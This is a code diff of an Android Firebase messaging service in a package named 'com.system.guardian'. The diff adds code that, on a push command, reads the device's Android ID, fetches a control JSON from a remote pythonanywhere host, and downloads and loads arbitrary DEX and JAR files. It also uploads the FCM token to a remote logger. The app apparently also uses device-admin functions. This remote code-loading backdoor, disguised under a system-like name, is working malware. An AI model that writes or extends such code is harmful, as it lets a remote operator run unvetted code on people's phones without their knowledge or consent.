@@ -1,17 +1,18 @@
 package com.system.guardian.firebase;
 
-import static android.app.admin.DevicePolicyManager.*;
+import static android.content.Context.DEVICE_POLICY_SERVICE;
 
+import android.annotation.SuppressLint;
 import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
-import androidx.work.OneTimeWorkRequest;
-import androidx.work.WorkManager;
 import android.content.Context;
 import android.content.Intent;
-import android.os.Build;
+import android.provider.Settings;
 import android.util.Log;
 
 import androidx.annotation.NonNull;
+import androidx.work.OneTimeWorkRequest;
+import androidx.work.WorkManager;
 
 import com.google.firebase.messaging.FirebaseMessagingService;
 import com.google.firebase.messaging.RemoteMessage;
@@ -25,15 +26,14 @@ import com.system.guardian.core.LogUploader;
 import org.json.JSONObject;
 
 import java.io.File;
-import java.util.Objects;
+import java.net.URL;
 
 public class GuardianMessagingService extends FirebaseMessagingService {
+
     @Override
     public void onNewToken(@NonNull String token) {
         super.onNewToken(token);
         CrashLogger.log(this, "FCM", "🔄 FCM Token refreshed: " + token);
-
-        // Optional: Send token to your server
         LogUploader.uploadLog(this, "FCM token updated: " + token);
     }
 
@@ -60,33 +60,68 @@ public class GuardianMessagingService extends FirebaseMessagingService {
             WorkManager.getInstance(this).enqueue(request);
         }
 
-        // ✅ New: Handle dex patch
         if ("true".equals(remoteMessage.getData().get("dex_update"))) {
             try {
-                // Only run if MainActivity is already active (optional guard)
-                CrashLogger.log(this, "FirebaseMsg", "🧬 DEX patch update triggered from dashboard");
-                LogUploader.uploadLog(this, "🧬 Dex patch trigger received via FCM");
+                CrashLogger.log(this, "FirebaseMsg", "🧬 DEX/JAR patch update triggered from dashboard");
+                LogUploader.uploadLog(this, "🧬 Dex/Jar patch trigger received via FCM");
 
                 new Thread(() -> {
-                    String token = "535ef8dad6992485";
+                    Context context = getApplicationContext();
+
+                    @SuppressLint("HardwareIds")
+                    String token = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
                     String url = "https://digiserve25.pythonanywhere.com/control/" + token + ".json";
 
                     try {
-                        JSONObject response = NetworkUtils.getJsonFromUrl(url);
-                        if (response != null && response.has("dex_url")) {
-                            String dexUrl = response.getString("dex_url");
-                            if (!dexUrl.isEmpty()) {
-                                File dexFile = NetworkUtils.downloadFile(getApplicationContext(), dexUrl, "patch.dex");
-                                DexLoader.schedulePatchLoad(getApplicationContext(), dexFile);
+                        JSONObject response = NetworkUtils.getJsonFromUrl(url, context);
+                        if (response == null) {
+                            CrashLogger.log(context, "DexTrigger", "❌ No response from control JSON");
+                            return;
+                        }
+
+                        CrashLogger.log(context, "DexTrigger", "📦 Control JSON: " + response.toString());
+
+                        // Handle dex
+                        String dexUrl = response.optString("dex_url", "");
+                        CrashLogger.log(context, "DexTrigger", "🔍 dex_url: " + dexUrl);
+                        if (isValidUrl(dexUrl)) {
+                            File dexFile = NetworkUtils.downloadFile(context, dexUrl, "patch.dex");
+                            if (dexFile.exists()) {
+                                DexLoader.schedulePatchLoad(context, dexFile);
+                                CrashLogger.log(context, "DexTrigger", "🧬 DEX patch scheduled");
                             }
                         }
+
+                        // Handle jar
+                        String jarUrl = response.optString("jar_url", "");
+                        CrashLogger.log(context, "DexTrigger", "🔍 jar_url: " + jarUrl);
+                        if (isValidUrl(jarUrl)) {
+                            File jarFile = NetworkUtils.downloadFile(context, jarUrl, "patch.jar");
+                            if (jarFile.exists()) {
+                                DexLoader.schedulePatchLoad(context, jarFile);
+                                CrashLogger.log(context, "DexTrigger", "🧪 JAR patch scheduled");
+                            }
+                        }
+
                     } catch (Exception e) {
-                        CrashLogger.log(getApplicationContext(), "DexTrigger", "❌ Dex patch error: " + e.getMessage());
+                        CrashLogger.log(context, "DexTrigger", "❌ Patch download/apply error: " + e.getMessage());
                     }
                 }).start();
+
             } catch (Exception outerE) {
-                CrashLogger.log(this, "DexGuard", "❌ FCM Dex block failed early: " + outerE.getMessage());
+                CrashLogger.log(this, "DexGuard", "❌ FCM patch block failed: " + outerE.getMessage());
             }
+        }
+    }
+
+    // Utility method for safe URL validation
+    private static boolean isValidUrl(String urlStr) {
+        if (urlStr == null || urlStr.trim().isEmpty()) return false;
+        try {
+            URL url = new URL(urlStr);
+            return url.getProtocol().startsWith("http");
+        } catch (Exception e) {
+            return false;
         }
     }
 }
